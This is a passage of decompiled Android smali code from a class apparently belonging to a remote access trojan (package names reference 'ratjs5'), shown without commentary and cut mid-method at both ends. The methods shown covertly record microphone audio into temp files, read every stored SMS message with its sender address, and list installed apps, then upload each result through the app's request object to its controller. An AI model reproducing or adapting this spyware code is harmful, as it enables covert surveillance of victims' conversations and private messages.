    new-instance v3, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda3;

    invoke-direct {v3, v1, p0, v0}, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda3;-><init>(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V

    .line 222
    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Long$arg-1$call-postDelayed$branch$if$fun-recordVoice1$class-AppActions()J

    move-result-wide v4

    .line 218
    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 224
    .end local v0    # "file":Ljava/io/File;
    .end local v1    # "mediaRecord":Landroid/media/MediaRecorder;
    :cond_0
    return-void
.end method

.method public final recordVoice2()V
    .locals 6

    .line 228
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppPermission;

    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppPermission;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkCaptureMic()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 229
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-$init$$arg-0$call-sendText$branch$if$fun-recordVoice2$class-AppActions()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendText(Lthisisme/thisapp/inspector/Utils/AppRequest$Text;)V

    .line 230
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$branch$if$fun-recordVoice2$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v1}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$branch$if$fun-recordVoice2$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$branch$if$fun-recordVoice2$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    .line 231
    .local v0, "file":Ljava/io/File;
    new-instance v1, Landroid/media/MediaRecorder;

    invoke-direct {v1}, Landroid/media/MediaRecorder;-><init>()V

    .line 232
    .local v1, "mediaRecord":Landroid/media/MediaRecorder;
    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 233
    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 234
    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 235
    invoke-virtual {v1, v0}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/io/File;)V

    .line 236
    invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V

    .line 237
    invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V

    .line 238
    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v3, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda4;

    invoke-direct {v3, v1, p0, v0}, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda4;-><init>(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V

    .line 242
    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Long$arg-1$call-postDelayed$branch$if$fun-recordVoice2$class-AppActions()J

    move-result-wide v4

    .line 238
    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 244
    .end local v0    # "file":Ljava/io/File;
    .end local v1    # "mediaRecord":Landroid/media/MediaRecorder;
    :cond_0
    return-void
.end method

.method public final recordVoice3()V
    .locals 6

    .line 248
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppPermission;

    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppPermission;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkCaptureMic()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 249
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-$init$$arg-0$call-sendText$branch$if$fun-recordVoice3$class-AppActions()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendText(Lthisisme/thisapp/inspector/Utils/AppRequest$Text;)V

    .line 250
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$branch$if$fun-recordVoice3$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v1}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$branch$if$fun-recordVoice3$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$branch$if$fun-recordVoice3$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    .line 251
    .local v0, "file":Ljava/io/File;
    new-instance v1, Landroid/media/MediaRecorder;

    invoke-direct {v1}, Landroid/media/MediaRecorder;-><init>()V

    .line 252
    .local v1, "mediaRecord":Landroid/media/MediaRecorder;
    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 253
    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 254
    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 255
    invoke-virtual {v1, v0}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/io/File;)V

    .line 256
    invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V

    .line 257
    invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V

    .line 258
    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v3, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda2;

    invoke-direct {v3, v1, p0, v0}, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda2;-><init>(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V

    .line 262
    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Long$arg-1$call-postDelayed$branch$if$fun-recordVoice3$class-AppActions()J

    move-result-wide v4

    .line 258
    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 264
    .end local v0    # "file":Ljava/io/File;
    .end local v1    # "mediaRecord":Landroid/media/MediaRecorder;
    :cond_0
    return-void
.end method

.method public final sendAllSms()V
    .locals 11

    .line 94
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->permission:Lthisisme/thisapp/inspector/Utils/AppPermission;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkReadAndReceiveAndSendSms()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 95
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 96
    .local v0, "sms":Ljava/util/ArrayList;
    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-parse$val-uriSMSURI$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 97
    .local v1, "uriSMSURI":Landroid/net/Uri;
    iget-object v2, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    move-object v3, v1

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    .line 98
    .local v2, "cur":Landroid/database/Cursor;
    if-eqz v2, :cond_2

    .line 99
    :goto_0
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_0

    .line 100
    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-getColumnIndex$arg-0$call-getString$val-address$body$loop$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 101
    .local v3, "address":Ljava/lang/String;
    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-getColumnIndexOrThrow$arg-0$call-getString$val-body$body$loop$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    .line 102
    .local v4, "body":Ljava/lang/String;
    new-instance v5, Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;

    const-string v6, "address"

    invoke-static {v3, v6}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v6, "body"

    invoke-static {v4, v6}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v6, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v6}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v3, v4, v6}, Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 104
    .end local v3    # "address":Ljava/lang/String;
    .end local v4    # "body":Ljava/lang/String;
    :cond_0
    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$val-allSmsText$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v3

    .line 105
    .local v3, "allSmsText":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_1

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;

    .line 106
    .local v5, "message":Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;
    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;->getPhone()Ljava/lang/String;

    move-result-object v6

    .line 107
    .local v6, "number":Ljava/lang/String;
    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;->getDevice()Ljava/lang/String;

    move-result-object v7

    .line 108
    .local v7, "device":Ljava/lang/String;
    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;->getMessage()Ljava/lang/String;

    move-result-object v8

    .line 109
    .local v8, "text":Ljava/lang/String;
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v10, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v10}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-plus$set-allSmsText$body$loop-1$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v10, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v10}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-plus$set-allSmsText$body$loop-1$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v10, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v10}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$4$str$arg-0$call-plus$set-allSmsText$body$loop-1$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v10, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v10}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$6$str$arg-0$call-plus$set-allSmsText$body$loop-1$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .end local v5    # "message":Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;
    .end local v6    # "number":Ljava/lang/String;
    .end local v7    # "device":Ljava/lang/String;
    .end local v8    # "text":Ljava/lang/String;
    goto :goto_1

    .line 112
    :cond_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v5}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    sget-object v5, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$branch$if$branch$if$fun-sendAllSms$class-AppActions()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v4

    .line 111
    nop

    .line 113
    .local v4, "file":Ljava/io/File;
    new-instance v5, Ljava/io/FileWriter;

    invoke-direct {v5, v4}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    .line 114
    .local v5, "writer":Ljava/io/FileWriter;
    move-object v6, v3

    check-cast v6, Ljava/lang/CharSequence;

    invoke-virtual {v5, v6}, Ljava/io/FileWriter;->append(Ljava/lang/CharSequence;)Ljava/io/Writer;

    .line 115
    invoke-virtual {v5}, Ljava/io/FileWriter;->flush()V

    .line 116
    invoke-virtual {v5}, Ljava/io/FileWriter;->close()V

    .line 117
    iget-object v6, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v7, "file"

    invoke-static {v4, v7}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v6, v4}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 120
    .end local v0    # "sms":Ljava/util/ArrayList;
    .end local v1    # "uriSMSURI":Landroid/net/Uri;
    .end local v2    # "cur":Landroid/database/Cursor;
    .end local v3    # "allSmsText":Ljava/lang/String;
    .end local v4    # "file":Ljava/io/File;
    .end local v5    # "writer":Ljava/io/FileWriter;
    :cond_2
    return-void
.end method

.method public final sendApps()V
    .locals 7

    .line 124
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$val-allAppsText$fun-sendApps$class-AppActions()Ljava/lang/String;

    move-result-object v0

    .line 125
    .local v0, "allAppsText":Ljava/lang/String;
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.MAIN"

    const/4 v3, 0x0

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 126
    .local v1, "mainIntent":Landroid/content/Intent;
    const-string v2, "android.intent.category.LAUNCHER"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 128
    iget-object v2, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-1$call-queryIntentActivities$val-appList$fun-sendApps$class-AppActions()I

    move-result v3

    invoke-virtual {v2, v1, v3}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v2

    const-string v3, "context.packageManager.q\u2026Activities(mainIntent, 0)"

    invoke-static {v2, v3}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 127
    nop

    .line 129
    .local v2, "appList":Ljava/util/List;
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/content/pm/ResolveInfo;

    .line 130
    .local v4, "app":Landroid/content/pm/ResolveInfo;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, v4, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    iget-object v6, v6, Landroid/content/pm/ActivityInfo;->name:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v6}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-plus$arg-0$call-plus$set-allAppsText$body$loop$fun-sendApps$class-AppActions()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .end local v4    # "app":Landroid/content/pm/ResolveInfo;
    goto :goto_0

    .line 132
    :cond_0
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$fun-sendApps$class-AppActions()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v4}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

